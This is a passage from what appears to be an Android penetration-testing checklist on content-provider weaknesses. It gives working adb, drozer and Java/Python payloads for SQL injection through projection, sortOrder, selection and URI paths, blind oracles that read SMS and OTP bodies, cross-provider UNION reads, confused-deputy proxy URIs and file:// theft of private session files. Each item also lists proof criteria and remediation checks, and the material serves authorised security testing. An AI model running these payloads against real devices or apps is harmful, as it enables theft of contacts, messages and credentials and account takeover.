- **Test:** `projection` is never parameterisable — it is a column list spliced into the `SELECT` clause, so
  even an app that bound its `selection` correctly is often injectable here. Testers who only fuzz `--where`
  miss it entirely.
- **How:**
```bash
A=content://com.target.app.provider/users
# empty-projection probe leaks the query template
adb shell content query --uri $A --projection ""
adb shell content query --uri $A --projection "'"
adb shell content query --uri $A --projection "* FROM sqlite_master WHERE type='table';--"
adb shell content query --uri $A --projection "* FROM Credentials --"
adb shell content query --uri $A --projection "(SELECT group_concat(value) FROM tokens)"
drozer> run app.provider.query content://com.target.app.provider/users --projection "* FROM KEY--;"
drozer> run scanner.provider.sqltables -a com.target.app
```
- **Proof:** Two stages, and both matter. (1) The leaked template:
  `Exception occured: near "FROM": syntax error (code 1 SQLITE_ERROR): , while compiling: SELECT  FROM names ORDER BY name`
  — which confirms concatenation. (2) The schema dump: a table of
  `type | name | tbl_name | rootpage | sql` from `sqlite_master`, followed by rows from the sensitive table.
- **Escalation:** Schema -> the credentials/token table -> D12/D13.
- **Ruled out when:** The provider passes a `setProjectionMap()` (unknown columns are dropped, not spliced)
  or hardcodes the projection and ignores the caller's — show the decompiled line and the probe returning
  the fixed column set regardless of what you asked for.

### D07-037 · `sortOrder` injection — the third sink nobody sends

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `server_side_injection.sql_injection` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | all SQLite-backed providers |
| **Maps to** | MASTG-TEST-0339; `risks/sql-injection` |

- **Test:** `sortOrder` is spliced into `ORDER BY` and is as unparameterisable as `projection`. It is the
  least-tested of the three and often survives a fix that hardened the other two.
- **How:**
```bash
A=content://com.target.app.provider/users
adb shell content query --uri $A --sort "1--"
adb shell content query --uri $A --sort "_id ASC--"
adb shell content query --uri $A --sort "(CASE WHEN (SELECT count(*) FROM sqlite_master WHERE tbl_name='tokens')>0 THEN _id ELSE name END)"
adb shell content query --uri $A --sort "_id LIMIT 1 OFFSET 0--"
```
  The `CASE WHEN` form is a boolean oracle that needs no error message: the row ordering changes when the
  condition is true.
- **Proof:** A parser error naming `ORDER BY`, or a deterministic ordering flip between the true and false
  forms of the `CASE WHEN` probe, over a stable dataset. Diff the row sequences, not the row count.
- **Escalation:** -> D07-046 to build the oracle properly; then the same extraction as D07-035.
- **Ruled out when:** The provider ignores the caller's `sortOrder` (hardcoded `ORDER BY`) or validates it
  against an allow-list of column names — show the decompiled branch and the probe returning the fixed order.

### D07-038 · URI path-segment injection into `appendWhere()`

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.sql_injection` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | providers whose `UriMatcher` routes a `*` wildcard segment into SQL |
| **Maps to** | MASTG-TEST-0339 and rule `mastg-android-sql-injection-contentprovider.yml` (the exact shape: a variable from `Uri.getPathSegments().get(...)` reaching `SQLiteQueryBuilder.appendWhere()`); MASTG-KNOW-0117; H1 #1650264 / GHSL-2022-059 |

- **Test:** A second, distinct sink from the `selection` parameter: the provider concatenates a URI path
  segment. The MASTG demo registers both `students/#` (numeric, constrained by `UriMatcher`) and
  `students/filter/*` (arbitrary string) — only the `*` route is exploitable, so check which arm your
  injectable read sits on before claiming it.
- **How:**
```bash
semgrep -c rules/mastg-android-sql-injection-contentprovider.yml out/sources/
grep -rnE 'appendWhere\(|getPathSegments\(\)\.get\(|getLastPathSegment\(\)' out/sources/ | grep -iE 'where|query|_ID'
adb shell content query --uri "content://com.target.app.provider/students/filter/1%20OR%201=1--"
adb shell content query --uri "content://com.target.app.provider/users/1'%20OR%20'1'='1"
# the ownCloud shape (GHSL-2022-059), where the path segment is concatenated in delete() too:
adb shell content delete --uri content://org.owncloud/file/1 --where "1=1 OR '1'='1"
```
```kotlin
// vulnerable shape, verbatim
count = db.delete(ProviderTableMeta.FILE_TABLE_NAME,
    ProviderTableMeta._ID + "=" + uri.pathSegments[1] +
        if (!TextUtils.isEmpty(where)) " AND ($where)" else "", whereArgs)
```
- **Proof:** The query returning rows outside the intended selection (all rows instead of one), or a row
  count that changes with a boolean condition in the path segment. Include the `addURI` line showing the
  route uses `*`, not `#`.
- **Escalation:** -> D07-035's extraction chain; the `delete()`/`update()` form is an integrity finding.
- **Ruled out when:** Every `UriMatcher` arm that feeds SQL uses `#` (digits only), or the segment is
  parsed through `Long.parseLong()`/`ContentUris.parseId()` before use — show the parse and the exception
  your non-numeric probe triggers.

### D07-039 · Injection in `update()`/`delete()`/`insert()` selection — the blind boolean oracle

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.sql_injection` (P1); `broken_authentication_and_session_management.authentication_bypass` (P1) when it reads OTP SMS |
| **Attacker** | AM-03 |
| **Applies to** | exported providers with `writePermission` absent |
| **Maps to** | **CVE-2025-10184** (OnePlus OxygenOS Telephony provider permission bypass); HackTricks `drozer-tutorial/exploiting-content-providers.md`, `android-checklist.md`; H1 #1650264 (GHSL-2022-059) |

- **Test:** `query()` is the method everyone tests. The write methods take a caller-controlled `WHERE` too,
  and when a provider is exported with a `readPermission` but no `writePermission` — an extremely common
  OEM and enterprise mistake — you get a Boolean oracle over the entire database file, including tables
  normally behind `READ_SMS`. This is the reason a write permission alone is not containment.
- **How:**
```bash
drozer> run app.provider.info -a com.target.app       # look for read set, write missing
# co-location probe: does the sensitive table live in this DB file?
adb shell content query --uri content://service-number/service_number \
  --where '(SELECT COUNT(*) FROM (SELECT tbl_name FROM sqlite_master WHERE tbl_name = "sms"))>0'
# seed a row if update() would otherwise affect 0 rows
adb shell content insert --uri content://service-number/service_number --bind hash_number:s:dummy
# one blind bit
adb shell content update --uri content://service-number/service_number --bind rowid:s:123 \
  --where '1=1 AND unicode(substr((SELECT body FROM sms ORDER BY rowid DESC LIMIT 1),1,1)) BETWEEN 48 AND 57'
```
  The oracle: TRUE if `update()` returns rows-affected > 0 **or** throws `UNIQUE constraint failed`; FALSE
  otherwise. Binary-search `[0..127]` per character with
  `1=1 AND unicode(substr((<subquery>), <idx>, 1)) BETWEEN <lo> AND <hi>`. Drive it from Python, not shell
  (D07-008), and count the probes.
- **Proof:** Character-by-character reconstruction of an SMS body (or other protected row) by an app
  declaring **no** `READ_SMS`, with the rows-affected / `UNIQUE`-exception differential shown for a known
  true and a known false probe.
- **Escalation:** Reading OTP SMS is account takeover on any service using SMS 2FA -> D13/D15. Wild URIs
  worth trying on OEM builds: `content://service-number/service_number`, `content://push-mms/push`,
  `content://push-shop/push_shop`.
- **Ruled out when:** `writePermission` is present and at least as strong as `readPermission`, **or** the
  write methods bind their selection through `selectionArgs` — and your known-true and known-false probes
  return the same rows-affected value.

### D07-040 · Balanced-subquery injection that survives `setStrict(true)`

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.sql_injection` (P1) |
| **Attacker** | AM-03 (holding any legitimate grant on the provider) |
| **Applies to** | any provider that AND-glues the caller's selection onto its own scope constraint |
| **Maps to** | **CVE-2026-28576** (Android 17 Contacts Provider), GHSA-ph86-9mcx-3p6r (CVSS v4 10.0 per GitHub's advisory; High in the Android bulletin), PoC `github.com/mobilehackinglab/CVE-2026-28576-poc`; **CVE-2022-20518** (`MmsSmsProvider.java`, "possible access to restricted tables due to SQL injection", OSV `PUB-A-224770203`) |

- **Test:** The interesting question is never "can I break out of the `WHERE` clause" — paren-wrapping
  stopped that years ago — but "what can I run while staying inside it". A balanced subquery is valid SQL,
  needs no quote-breaking, and survives `setStrict(true)`, because `setStrict` only wraps the caller's
  selection in parentheses. The provider AND-glues your selection onto its own grant enforcement, so the
  subquery executes with the provider's own reach.
- **How:** Hold whatever URI you are legitimately allowed (a picker grant, a public path), then:
```java
contentResolver.query(
    grantedUri,
    new String[]{"_id"},
    "1 AND (SELECT substr(data1,3,1) FROM data"
        + " WHERE mimetype_id=(SELECT _id FROM mimetypes"
        + " WHERE mimetype='vnd.android.cursor.item/phone_v2')"
        + " ORDER BY _id LIMIT 1 OFFSET 0)='5'",
    null, null);
boolean hit = cursor.getCount() == 1;     // one bit of the database per query
```
  The assembled statement:
```sql
SELECT _id FROM view_contacts
WHERE (_id=? AND lookup=?)          -- the provider's ENTIRE grant enforcement
  AND (1 AND (SELECT substr(data1,3,1) FROM data ... LIMIT 1 OFFSET 0)='5')
```
  Iterate `LIMIT 1 OFFSET k` across rows and mimetypes for a full dump.
- **Proof:** A boolean oracle — `cursor.getCount() == 1` on a correct character, `0` on a wrong one, over a
  dataset you seeded so the ground truth is known. MHL report roughly one second per phone number; a
  three-contact device dumped in about thirty seconds.
- **Escalation:** The subquery reads tables the grant never covered. For the platform CVE that meant every
  phone number, email, postal address and note on the device with no `READ_CONTACTS` -> D20. **The generic
  technique applies to any app-owned provider on any API level** — that is what makes this item worth
  running against your target, not just against Android 17.
- **Ruled out when:** `setStrictGrammar(true)` (or `setStrictColumns(true)` with a projection map) is active
  for your caller and the identical payload throws `IllegalArgumentException: Invalid token SELECT` — prove
  it with D07-041 rather than assuming. Platform gate for the CVE itself: Android 17, SPL < 2026-07-01,
  caller `targetSdk <= 36`; Android 14/15/16 are unaffected because the gating code never existed there.

### D07-041 · Establish whether strict SQL checking is on — your own negative control

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (negative control) |
| **Attacker** | AM-03 |
| **Applies to** | Android builds exposing the compat change; `am compat` itself is Android 10+ |
| **Maps to** | CVE-2026-28576 "The Patched Behavior"; compat change `ENFORCE_STRICT_SQL_CHECKS` id `484953293`, `enableAfterTargetSdk="36"`; `SQLiteQueryBuilder.setStrictGrammar()` |

- **Test:** Before you claim an injection, prove the defence exists and that you are outside it. Android's
  hardening ships behind a `targetSdk`-gated compat change, so a caller targeting SDK <= 36 skips it
  entirely — and the attacker chooses their own `targetSdk`, which means the app under test cannot mitigate
  by raising its own. Force the strict path on and re-run the identical query.
- **How:**
```bash
adb shell am compat enable 484953293 com.poc.stub
# Enabled change 484953293 for com.poc.stub.
# re-run the exact payload from D07-040
adb shell am compat disable 484953293 com.poc.stub
adb shell am compat reset 484953293 com.poc.stub
```
- **Proof:** The same app, same grant, same payload, now throwing
  `IllegalArgumentException: Invalid token SELECT` with the change enabled and returning the oracle result
  with it disabled. `setStrictGrammar(true)` tokenises the selection and rejects the `SELECT` keyword
  outright; this is the exact exception Google's CTS regression test asserts.
- **Escalation:** -> D07-072 evidence package. A negative control of this quality is what makes a provider
  injection undeniable at triage.
- **Ruled out when:** n/a — this is a control, not a finding. If the compat change is unavailable on the
  build, say so and substitute a decompiled-source check for `setStrict*` calls.

### D07-042 · Cross-provider SQL injection through a shared SQLite database

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `server_side_injection.sql_injection` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | apps declaring two or more providers over one database file |
| **Maps to** | Oversecured content-providers post (§SQL Injection via Selection Parameters); H1 #518669 |

- **Test:** The permission boundary between two providers is void if they share one `SQLiteOpenHelper` or
  one database file. The unprotected provider concatenates your selection; a `UNION SELECT` then reads the
  table that the *protected* provider was guarding. This defeats the "this URI only exposes the harmless
  table" argument entirely.
- **How:**
```bash
# find two providers with different permission levels backed by one DB
grep -rnE 'DATABASE_NAME|extends SQLiteOpenHelper|super\(context, *"' out/sources/ | sort -u
grep -nE '<provider' -A6 out/AndroidManifest.xml | grep -E 'authorities|Permission'
adb shell content query --uri content://com.target.app.insensitive/ \
  --where "1=2 UNION SELECT * FROM Sensitive -- "
adb shell content query --uri content://com.target.app.insensitive/ \
  --where "1=1) UNION SELECT name,sql FROM sqlite_master--"
```
```java
query(Uri.parse("content://com.target.app.insensitive/"), null,
      "1=2 UNION SELECT * FROM Sensitive -- ", null, null);
```
- **Proof:** Rows from the protected table returned through the unprotected authority, alongside a
  `Permission Denial` on the protected authority for the same table. The pair is the finding.
- **Escalation:** Whatever the sensitive table holds -> D11/D13/D15.
- **Ruled out when:** Each provider owns a separate database file (show the distinct `DATABASE_NAME`
  constants), or all caller input is bound via `selectionArgs`. The remediation is also the test hint: apps
  that keep one database per provider cannot be unioned across.

### D07-043 · Projection-map or caller check applied to only one `UriMatcher` branch

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `server_side_injection.sql_injection` (P1) |
| **Attacker** | AM-03 |
| **Applies to** | providers with more than two `UriMatcher` arms |
| **Maps to** | H1 #518669 (Nextcloud, Low 0.9, $100) — the caller check runs for `ROOT_DIRECTORY`/`SINGLE_FILE`/`DIRECTORY` but the projection-map restriction is applied only when `mUriMatcher.match(uri) == ROOT_DIRECTORY` |

- **Test:** Providers restrict columns or check the caller for the "root" URI and forget the sibling
  branches. Read the `switch (mUriMatcher.match(uri))` and diff which arms get which guard — do not test
  the arms, read them, then test the gap.
- **How:**
```bash
grep -rn -A80 'mUriMatcher.match(\|sUriMatcher.match(' out/sources/ \
  | grep -nE 'case [A-Z_]+:|setProjectionMap|checkCall|getCallingPackage|appendWhere|throw '
adb shell content query --uri content://org.nextcloud/file --projection "* from ocshares --"
```
- **Proof:** A row from a table that the branch was never meant to serve, e.g.
```
Row: 0 _id=1, file_source=71580, share_type=3, path=/Nextcloud.mp4, token=rkNCkcYcbGEBDQN,
     owner_share=julien_contacts@cloud.local.example.com, is_password_protected=0
```
- **Escalation:** This is the item where the local bug becomes a remote one. In #518669 the recovered share
  `token` forged `https://<server>/index.php/s/rkNCkcYcbGEBDQN`, which loaded the shared file
  unauthenticated from the internet -> D15. The forged URL, not the local read, is what makes it a real
  finding; test every token-shaped column against the backend (D07-067).
- **Ruled out when:** Every `UriMatcher` arm that serves a cursor passes through the same projection-map and
  the same caller check — show the shared helper both arms call.

### D07-044 · `scanner.provider.injection` has a one-string oracle

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (false-negative control) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | drozer `scanner/provider/injection.py` source: it issues `query(uri, projection=["'"])` and `query(uri, selection="'")` and marks the URI vulnerable **only** if the exception text contains `"unrecognized token"`; reports under `Injection in Projection:` / `Injection in Selection:` |

- **Test:** Any provider that catches the exception, returns an empty cursor, or emits a different SQLite
  message is reported clean. Use the scanner to *classify* which parameter is injectable — that saves a
  fuzzing round — then confirm and extend by hand.
- **How:**
```bash
drozer> run scanner.provider.injection -a com.target.app
drozer> run scanner.provider.injection --uri content://com.target.app.provider/users
drozer> run scanner.provider.sqltables -a com.target.app
# manual extension in both sinks
drozer> run app.provider.query content://<auth>/users --projection "* FROM sqlite_master WHERE type='table'--"
drozer> run app.provider.query content://<auth>/users --projection "sql FROM sqlite_master--"
drozer> run app.provider.query content://<auth>/users --selection "1=1"
drozer> run app.provider.query content://<auth>/users --selection "1=0"
drozer> run app.provider.query content://<auth>/users --selection "_id=1 OR 1=1--"
```
  `--selection-args` is the *safe* path; its presence in the app's own code is the fix.
- **Proof:** Either the scanner's classification plus a working payload in that parameter only, or a manual
  hit on a URI the scanner listed clean. Note drozer is a degraded tool on modern devices — the
  `adb shell content` equivalents are the reliable ones.
- **Escalation:** -> D07-035/-036.
- **Ruled out when:** n/a. A clean scanner run is never the ruled-out basis; the `1=1`/`1=0` body diff plus
  the source check is.

### D07-045 · Drive the provider surface through Burp with `auxiliary.webcontentresolver`

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (tooling) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | drozer `auxiliary.webcontentresolver` — "Start a Web Service interface to Content Providers. This allows you to use web application testing capabilities and tools to test content providers." |

- **Test:** Turning a suspected blind provider injection into a demonstrated full-table dump by hand is slow.
  Exposing the device's `ContentResolver` over HTTP lets you point Repeater, Intruder, ffuf or sqlmap at
  `projection` and `selection` at scale — with a response-length oracle that is far cleaner than parsing
  `content` output.
- **How:**
```
dz> run auxiliary.webcontentresolver --port 8080
    WebContentResolver started on port 8080.
```
```bash
adb forward tcp:8080 tcp:8080
curl 'http://127.0.0.1:8080/query?uri=content://com.target.app.provider/users'
curl 'http://127.0.0.1:8080/query?uri=content://com.target.app.provider/users&selection=1%3D1'
# then proxy through Burp at 127.0.0.1:8080 and Intruder the selection parameter
```
- **Proof:** An Intruder run over `selection` producing a response-length delta that confirms a blind
  oracle, with the results table (payload, status, length) as the evidence.
- **Escalation:** Automated confirmation -> full DB extraction -> D07-065.
- **Ruled out when:** n/a — tooling. Note that everything it reaches, it reaches as drozer's app UID, which
  is the correct AM-03 framing (D07-007).

### D07-046 · Oracle discipline — body-diff and the n>=10 interleaved sample

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (false-positive gate) |
| **Attacker** | AM-03 |
| **Applies to** | every blind or boolean provider claim |
| **Maps to** | the Body-Diff Rule (a byte-identical result is not a bypass) and the Statistical-Sample Rule (n>=10 interleaved trials, >=2 sigma) |

- **Test:** Two failure modes kill provider-injection reports at triage. (a) **Body-diff**: a cursor with
  the same row count is not evidence — an identical result set for `1=1` and `1=0` means your string never
  reached SQL, or the provider swallowed the exception. Diff the rows, not the count and not the presence
  of output. (b) **Statistical**: blind oracles built on timing, rows-affected or race-dependent symlink
  swaps need a distribution, not an outlier. Single trials on a device under load routinely produce 2x
  variance.
- **How:**
```bash
# (a) body diff, not status
adb shell content query --uri "$A" --where "1=1" > /tmp/true.txt
adb shell content query --uri "$A" --where "1=0" > /tmp/false.txt
diff /tmp/true.txt /tmp/false.txt && echo "NO DIFFERENTIAL -> not an oracle"
wc -l /tmp/true.txt /tmp/false.txt
```
```python
# (b) n>=10 interleaved, randomised order, with the counts printed
import random, subprocess, statistics
def probe(where):
    r = subprocess.run(["adb","shell","content","query","--uri",A,"--where",where],
                       capture_output=True, text=True, timeout=30)
    return len(r.stdout.strip().splitlines())
trials = [("T","1=1"),("F","1=0")]*10
random.shuffle(trials)
res = {"T":[], "F":[]}
for label, w in trials: res[label].append(probe(w))
for k,v in res.items():
    print(k, "n=",len(v), "mean=",statistics.mean(v),
          "sd=", statistics.pstdev(v) if len(v)>1 else 0)
```
- **Proof:** The row-level diff for the boolean claim, or the two distributions (n, mean, sigma) for the
  statistical claim, with the suspect group's mean at least 2 sigma from the control's.
- **Escalation:** n/a — this is a kill gate that converts a probable retraction into a defensible High.
- **Ruled out when:** No differential survives the diff, or the two distributions overlap within 2 sigma.
  Record the retraction per D07-073 rather than silently dropping it.

### D07-047 · Marker discipline for provider write and reflection claims

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (false-positive gate) |
| **Attacker** | AM-03 |
| **Applies to** | every provider write or "my data appeared in the app" claim |
| **Maps to** | Marker Discipline — 8+ character random markers, and search the BASELINE for the marker first |

- **Test:** A provider write is only proven if the value you see afterwards is unmistakably yours. Writing
  `test`, `admin`, `attacker` or `1` into a row and then finding that string in the UI or in a later query
  proves nothing — those strings occur naturally in seed data, in placeholder rows and in the app's own
  test fixtures. The same applies to a value you inject into a provider and then expect to see rendered in
  a WebView or sent to the backend.
- **How:** Use a random alphanumeric marker of at least eight characters with no English words and no
  protocol keywords. **Search the baseline — the pre-write query output, the pre-write UI, the pre-write
  HTTP capture — for the marker string before claiming anything.**
```bash
M="zq7x4kd9m2"                       # 10 chars, no dictionary words
adb shell content query --uri "$A/users" > /tmp/baseline.txt
grep -c "$M" /tmp/baseline.txt        # MUST be 0
adb shell content insert --uri "$A/users" --bind name:s:"$M" --bind role:s:admin
adb shell content query  --uri "$A/users" | grep "$M"
# and, for the rendered/exfiltrated form:
adb logcat -d | grep "$M"
# check the proxy capture for the same marker before claiming the value reached the backend
```
- **Proof:** The marker present in the post-write artefact and absent from the baseline, both shown. Never
  use the target's own domain, `evil`, `payload`, `script` or `AAAA` as a marker.
- **Escalation:** A marker that reaches a WebView -> D10 stored XSS; a marker that reaches the backend ->
  D15 and D07-067.
- **Ruled out when:** The marker appears in the baseline (word collision — pick another), or the post-write
  query does not contain it (the write silently failed, which many providers do by returning a URI without
  committing).

### D07-048 · Provider that proxies a caller-supplied `content://` URI

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) — argue P1/P2 on the permission re-delegation |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | Oversecured content-providers post (§Proxying to Unintended Providers: "Developers should avoid proxying requests to other providers"); `risks/content-resolver` |

- **Test:** A provider that takes a URI as a *parameter* — a path segment, a query parameter, a `call()`
  bundle key — and dereferences it with `getContext().getContentResolver()` turns the victim into a
  universal read/write proxy for every provider the victim can reach. Limited only by the victim's own
  grants, which usually include the system's.
- **How:**
```bash
# the sink: a ContentResolver call INSIDE a ContentProvider method
grep -rnE 'getContentResolver\(\)\.(query|openInputStream|openOutputStream|openFileDescriptor|openAssetFileDescriptor|call)' out/sources/ \
  | grep -inE 'uri\.getQueryParameter|Uri\.parse\(|getPathSegments|extras\.getString'
adb shell content query --uri 'content://com.target.app.proxy/?uri=content%3A%2F%2Fcom.android.contacts%2Fdata%2Fphones'
adb shell content query --uri 'content://com.target.app.proxy/?uri=content%3A%2F%2Fsms%2Finbox'
adb shell content read  --uri 'content://com.target.app.proxy/r?m=content%3A%2F%2Fcom.android.contacts%2Fcontacts%2F1%2Fphoto'
```
  Always run the two-step control: first the direct read from your no-permission app (must fail), then the
  same URI wrapped by the deputy.
- **Proof:** Step 1 returns
  `SecurityException: ... requires android.permission.READ_CONTACTS or android.permission.WRITE_CONTACTS`;
  step 2 returns the rows or the image bytes to the *same* unprivileged app. Both outputs in the report.
  The Google Messages `AvatarContentProvider` case is the reference shape — the observation that starts it
  is literally the manifest line: exported provider + `grantUriPermissions="true"` + no `android:permission`.
- **Escalation:** -> D13 (SMS/OTP interception), -> D20 (contacts/PII at scale). Extend to every permission
  the deputy holds: SMS, call log, storage, location, calendar.
- **Ruled out when:** The provider validates the incoming URI with all three documented checks —
  `belongsToCurrentApplication()`, `isExported()` and `checkUriPermission()` for the *original* caller —
  and your probe with a foreign authority is rejected. Their absence is the detection signature:
```kotlin
fun isExported(ctx: Context, uri: Uri): Boolean =
    ctx.packageManager.resolveContentProvider(uri.authority.toString(), 0)!!.exported
fun wasGrantedPermission(ctx: Context, uri: Uri?, grantFlag: Int): Boolean =
    ctx.checkUriPermission(uri, Process.myPid(), Process.myUid(), grantFlag) ==
        PackageManager.PERMISSION_GRANTED
```

### D07-049 · Provider forwarding to a system provider under the app's own permission

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
| **Attacker** | AM-03 |
| **Applies to** | apps holding a dangerous permission and exposing a provider |
| **Maps to** | Oversecured Class #6/#31 provider-to-provider proxying; T1636 Protected User Data (.001–.005) |

- **Test:** The narrower, more common cousin of D07-048: the provider does not take an arbitrary URI, it
  just serves a *fixed* system URI to whoever asks. An app that legitimately holds `READ_CONTACTS` and
  exposes `content://com.target.app.contacts` has re-delegated that permission to every installed app —
  permission laundering. The same pattern appears as a cache file on shared storage.
- **How:**
```bash
grep -rnE 'ContactsContract|Telephony\.Sms|CallLog|CalendarContract|MediaStore' out/sources/ \
  | grep -inE 'ContentProvider|query\(|CursorLoader'
grep -nE 'READ_CONTACTS|READ_SMS|READ_CALL_LOG|READ_CALENDAR|ACCESS_FINE_LOCATION' out/AndroidManifest.xml
adb shell content query --uri content://com.target.app.contacts
adb shell content query --uri content://com.target.app.provider/messages
# the file variant of the same laundering
grep -rnE 'MODE_WORLD_READABLE|setReadable\(true, *false\)|getExternalFilesDir|getExternalCacheDir' out/sources/
adb shell ls -la /sdcard/Android/data/com.target.app/files /sdcard/Download 2>/dev/null
```
- **Proof:** Contact rows or SMS bodies returned to a test app declaring **no** contacts/SMS permission,
  with the app's own `<uses-permission>` line shown as the source of the access.
- **Escalation:** SMS bodies readable by a zero-permission app -> OTP capture -> D13 account takeover.
  Contacts at scale -> D20.
- **Ruled out when:** The app holds no dangerous permission whose data it re-serves, or the provider
  enforces a `signature`-level permission on the re-serving path (verify the protectionLevel per D07-013).
  Note `MODE_WORLD_READABLE` throws from API 24 (**LEGACY**) and other apps cannot read
  `Android/data/<pkg>` on Android 11+ without All-Files-Access — check the actual API level before rating
  the file variant.

### D07-050 · Fallback-response enumeration against a thumbnail or avatar deputy

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3), rising to P1 where the objects are other users' |
| **Attacker** | AM-03 |
| **Applies to** | image, avatar, thumbnail and document-preview providers |
| **Maps to** | HackTricks "Exported provider as a confused deputy"; the Google Messages `AvatarContentProvider` contacts bypass (fixed 2026-06-12, rewarded through the Mobile VRP) |

- **Test:** A deputy that returns a **stable fallback** for missing objects — a default avatar, a
  placeholder thumbnail, an empty file — is enumerable even when it "fails safely". Iterate predictable ids
  and keep every response whose size, hash or decoded pixels differ from the fallback. Rendering,
  resizing or transcoding does not remove the leak.
- **How:**
```bash
# capture the fallback once
adb shell content read --uri 'content://com.target.app.avatars/r?id=99999999' > /tmp/fallback.bin
FB=$(sha256sum /tmp/fallback.bin | cut -d' ' -f1)
python3 - <<'PY'
import subprocess, hashlib
fb = hashlib.sha256(open('/tmp/fallback.bin','rb').read()).hexdigest()
hits = 0; n = 0
for i in range(1, 501):
    uri = f"content://com.target.app.avatars/r?id={i}"
    r = subprocess.run(["adb","shell","content","read","--uri",uri],
                       capture_output=True, timeout=20)
    h = hashlib.sha256(r.stdout).hexdigest(); n += 1
    if r.stdout and h != fb:
        hits += 1; print(f"HIT id={i} bytes={len(r.stdout)} sha={h[:12]}")
print(f"[count] probed={n} hits={hits}")
PY
```
- **Proof:** The hit list with byte counts and hashes, plus one rendered image proving it is a real object
  belonging to someone else. The `[count]` line proves the sweep ran (D07-008).
- **Escalation:** -> D15 if the ids are the backend's object ids; -> D20 for the privacy write-up.
- **Ruled out when:** Every id returns the byte-identical fallback (hash equality across the sweep), or the
  deputy requires a per-object grant your app cannot obtain — show both the hash equality and the denial.

### D07-051 · The app's own `ContentResolver` fed an attacker `file://` URI

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.file_inclusion.local` (P1) |
| **Attacker** | AM-03 (delivery via an exported component) / AM-02 (via a deep link) |
| **Applies to** | all |
| **Maps to** | `risks/content-resolver` (MASVS-PLATFORM) — the documented variants: fully attacker-controlled `file://`, partially controlled with traversal, a `file://` to an attacker-controlled symlink, and a check/open race; H1 #876192 "Cookie steal through content Uri", #288955 "[IRCCloud Android] Theft of arbitrary files leading to token leakage", #161710 "Possible to steal any protected files on Android" |

- **Test:** `openFile()`, `openFileDescriptor()`, `openInputStream()`, `openOutputStream()` and
  `openAssetFileDescriptor()` all resolve `file://` URIs, and they resolve them **inside the victim's UID**.
  Any component that accepts a URI from outside and opens it can be pointed at the app's own private files
  — the app becomes the exfiltration channel for its own secrets.
- **How:**
```bash
grep -rn -B6 'openInputStream\|openOutputStream\|openFileDescriptor\|openAssetFileDescriptor' out/sources/ \
  | grep -inE 'getIntent\(\)|getData\(\)|EXTRA_STREAM|getParcelableExtra|getQueryParameter'
adb shell am start -n com.target.app/.ImportActivity -a android.intent.action.VIEW \
  -d 'file:///data/data/com.target.app/shared_prefs/session.xml'
adb shell am start -n com.target.app/.ImportActivity \
  --eu android.intent.extra.STREAM 'file:///data/data/com.target.app/databases/app.db'
# symlink variant
adb shell 'ln -s /data/data/com.target.app/shared_prefs/secrets.xml /sdcard/Android/data/com.poc/files/pic.jpg'
adb shell am start -n com.target.app/.ImportActivity -d file:///sdcard/Android/data/com.poc/files/pic.jpg
```
- **Proof:** The victim uploads, attaches or renders its own private file. Capture the outbound HTTP request
  body in the proxy containing `session.xml` or the `SQLite format 3` header — that request is the proof,
  not the fact that the activity accepted the URI.
- **Escalation:** D11 and D15 in one request: the file is the token store and the app posts it for you.
- **Ruled out when:** The app rejects the `file` scheme from other apps (an explicit
  `"content".equals(uri.getScheme())` check), **or** it performs the documented
  `openFileDescriptor` + `/proc/self/fd` real-path check:
```java
ParcelFileDescriptor fd = cr.openFileDescriptor(uri, "r");
Path real = Files.readSymbolicLink(Paths.get("/proc/self/fd/" + fd.getFd()));
boolean ok = real.startsWith(Paths.get(ctx.getApplicationInfo().dataDir));
```
  Note API 24+ `StrictMode` normally throws `FileUriExposedException` on the *sender* side — so also check
  whether the attacker can set `StrictMode.setVmPolicy(VmPolicy.LAX)` in their own process, which they can.
  The victim's acceptance is the bug, not the sender's policy.

### D07-052 · MIME-type-only intent filters implicitly accept `content:` and `file:`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `guide/components/intents-filters` data-test rules, quoted: an intent passes the URI test if "it has a `content:` or `file:` URI and the filter does not specify a URI format. In other words, a component is presumed to support `content:` and `file:` data if its filter lists *only* a MIME type." |

- **Test:** A filter declaring only `<data android:mimeType="image/*"/>` with no `scheme` is an open door
  for `file://` and `content://` URIs, which is the delivery half of D07-051. Reviewers reading the
  manifest see a MIME filter and assume a scheme constraint that is not there.
- **How:**
```bash
xmllint --format out/AndroidManifest.xml | grep -n '<data' | grep mimeType | grep -v scheme
adb shell am start -n com.target.app/.Viewer -a android.intent.action.VIEW \
  -t image/png -d 'file:///data/data/com.target.app/databases/app.db'
adb shell am start -a android.intent.action.SEND -t 'image/*' \
  --eu android.intent.extra.STREAM 'file:///data/data/com.target.app/shared_prefs/auth.xml' \
  -n com.target.app/.ShareTarget
```
- **Proof:** The component accepting and processing the `file://` URI — a render, an upload, or a crash
  naming the path. Pair it with D07-051 for the impact.
- **Escalation:** -> D07-051 arbitrary read; -> D05 for the implicit-resolution half.
